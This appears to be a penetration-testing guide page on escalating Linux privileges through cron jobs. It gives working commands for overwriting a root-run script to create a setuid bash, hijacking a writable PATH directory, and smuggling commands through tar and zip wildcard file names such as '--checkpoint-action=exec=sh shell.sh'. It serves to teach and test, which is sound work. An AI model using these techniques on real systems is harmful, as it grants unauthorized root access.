---
description: Scripts that execute automatically every once in a while
---

# Cron Jobs

Cron Jobs are a default way to execute commands or scripts in regular intervals. You can make scripts run every 2 minutes, every hour, every 3rd day of the month, etc. These jobs are defined in files and things like environment variables, or the user they run as can be specified there.&#x20;

They execute commands as other users, so if we as a low-privilege user can change some behavior of these commands to get us as shell as that other user, we escalate privileges. For some examples of commands/files that allow you to get a shell, see [#getting-shells](./#getting-shells "mention").

## Finding Cron Jobs

Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at `/etc/crontab` which is often readable by all users:

{% code title="/etc/crontab" %}
```bash
SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```
{% endcode %}

Here the top 4 jobs are pretty standard. Using the `run-parts` command they just say to run the scripts inside `/etc/cron.hourly`, `/etc/cron.daily`, `/etc/cron.weekly` and `/etc/cron.monthly`. They also say exactly when it will run, indicated by the first 5 values. The `/etc/cron.daily` directory for example runs every day at 6:25 AM, and you can see the scripts by listing them:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ls -la /etc/cron.daily
</strong>total 60
-rwxr-xr-x 1 root root   633 Jul 28  2015 apache2
-rwxr-xr-x 1 root root 14799 Apr 15  2011 apt
-rwxr-xr-x 1 root root   314 Aug 10  2011 aptitude
-rwxr-xr-x 1 root root   502 Jun 17  2010 bsdmainutils
-rwxr-xr-x 1 root root   256 Jun  5  2014 dpkg
-rwxr-xr-x 1 root root  4109 Oct 25  2012 exim4-base
-rwxr-xr-x 1 root root  2211 Oct 26  2010 locate
-rwxr-xr-x 1 root root    89 Apr 17  2010 logrotate
-rwxr-xr-x 1 root root  1335 Jan  2  2011 man-db
-rwxr-xr-x 1 root root   249 Feb 15  2011 passwd
-rwxr-xr-x 1 root root  3594 Dec 18  2010 standard
</code></pre>

Under those 4 directories, there are also two `overwrite.sh` and `compress.sh` scripts, which run **every minute** (indicated by the `* * * * *`). These are often interesting because they run so often, allowing us lots of chances to mess with them.&#x20;

{% hint style="info" %}
**Tip**: Use the `date` command to see the exact current time. Cron jobs execute at the 0-second mark so you'll know exactly when your payload should have executed.&#x20;

You can even use `watch date` to get a date output that updates every 2 seconds, so you can count down to exactly when it executes.&#x20;
{% endhint %}

Note that the `overwrite.sh` script does not have an absolute path, so we don't know yet where it is located. But we can use the `type` command to let the system resolve the PATH and find what it would execute:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ type overwrite.sh
</strong>overwrite.sh is /usr/local/bin/overwrite.sh
</code></pre>

## Overwriting scripts

These commands are executed by root, so we better make sure to check if we can overwrite any of these scripts to let root execute any commands of ours. You can use ls to check the permissions.&#x20;

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ls -la /usr/local/bin/overwrite.sh
</strong>-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
</code></pre>

Here we can see the owner (root) has `rwx` permissions, the staff group has `r--` permissions, and everybody else has `rw-` permissions. This means we can write to this script whatever we want:

{% code title="overwrite.sh" %}
```bash
#!/bin/bash

cp /bin/bash /tmp/bash; chmod +xs /tmp/bash
```
{% endcode %}

Then whenever the cron job triggers, a `/tmp/bash` file is created which we can get a shell from using:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ /tmp/bash -p
</strong># id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
</code></pre>

## PATH Variable

As seen in the crontab, some environment variables can be set before each job executes. One of these is the PATH, which just contains directories split by `:` where commands without absolute paths are found. Whenever you have write permissions over any of these directories, you can overwrite the relative commands with your own malicious script:

{% code title="PATH containing /home/user" %}
```
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```
{% endcode %}

{% hint style="warning" %}
Note that the first items in this PATH variable have the highest priority. If your writable directory is later in the PATH make sure the command is not defined in any directories before it.&#x20;
{% endhint %}

In this example, we saw the `overwrite.sh` command is executed, which is stored in `/usr/local/bin`. This comes after our writable `/home/user` directory meaning we can overwrite it with our own script:

{% code title="/home/user/overwrite.sh" %}
```bash
#!/bin/bash

cp /bin/bash /tmp/bash; chmod +xs /tmp/bash
```
{% endcode %}

Then we just need to make sure the script is actually executable by everyone:

```shell-session
$ chmod +x /home/user/overwrite.sh
```

When the cron job now triggers, the relative `overwrite.sh` command will first be found in the `/home/user` directory which we created, giving us a shell in `/tmp/bash`:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ /tmp/bash -p
</strong># id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
</code></pre>

## Wildcards (Argument Injection)

Bash allows you to use `*` wildcards in commands to insert any files that match the wildcard. This works by inserting all the matched files after each other separated by spaces in the command since most commands allow you to add as many files as you want by just adding more arguments.&#x20;

<pre class="language-shell-session" data-title="Example"><code class="lang-shell-session"><strong>$ ls -l
</strong>total 276
drwxrwxr-x  2 user   user     4096 Aug 20 16:00 directory/
-rw-rw-r--  1 user   user        0 Aug 20 16:00 first
-rw-rw-r--  1 user   user        0 Aug 20 16:00 second
<strong>$ file *  # Wildcard
</strong>directory: directory
first:     empty
second:    empty
<strong>$ file directory first second  # Equivalent
</strong>directory: directory
first:     empty
second:    empty
</code></pre>

The problem arises when you can create files starting with `-`, which are often flags to change the behavior of a command. Bash just pastes the files into the command, not bothering to check if any of them start with the `-` dash. This means we can add flags to the command and make it do different things.&#x20;

With the `file` command, for example, something innocent we can do is use the `-F` option to change the `:` separator we saw earlier. Arguments often don't need a space character, so we can just create a file called `-Fsomething` to add this argument to the file command if the wildcard is used. Another common way to pass arguments is by using the `=` equals sign for `--` arguments, like `--separator=something`. Here are two examples:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ touch -- -Fsomething  # Attack
</strong><strong>$ file *
</strong>directorysomething directory
firstsomething     empty
secondsomething    empty
<strong>$ rm -- -Fsomething  # Remove previous attack
</strong>
<strong>$ touch -- --separator=something  # Other attack
</strong><strong>$ file *
</strong>directorysomething directory
firstsomething     empty
secondsomething    empty
</code></pre>

{% hint style="info" %}
**Tip**: Use the `--` characters alone to not interpret the following arguments as flags. This is how you should secure a wildcard vulnerability like this, and also how you can easily place your payload using without `touch` thinking they're flags too.&#x20;
{% endhint %}

One limitation you have is the fact that the `*` wildcard orders your arguments alphabetically. Luckily the `-` dash character comes before other alphanumeric characters, meaning our injected arguments will always be first. You just have to find a way to add arguments that allow you to do unintended things.&#x20;

### ZIP

{% code title="Vulnerable command" %}
```bash
zip /tmp/backup.zip *
```
{% endcode %}

```shell-session
$ nano shell.sh  # Any payload you want to execute
$ touch -- -T
$ touch -- '--unzip-command=sh shell.sh'
```

### Tar

{% code title="Vulnerable command" %}
```shell-session
tar czf /tmp/backup.tar.gz *
```
{% endcode %}

```shell-session
$ nano shell.sh  # Any payload you want to execute
$ touch -- --checkpoint=1
$ touch -- '--checkpoint-action=exec=sh shell.sh'
```

For **more** Argument Injection payloads like this for different tools, see the following two collections:

{% embed url="https://gtfoargs.github.io/" %}
A list of many different and common tools, and what functionality they can have
{% endembed %}

{% embed url="https://sonarsource.github.io/argument-injection-vectors/" %}
A few specific tools with system command and file write functionality
{% endembed %}
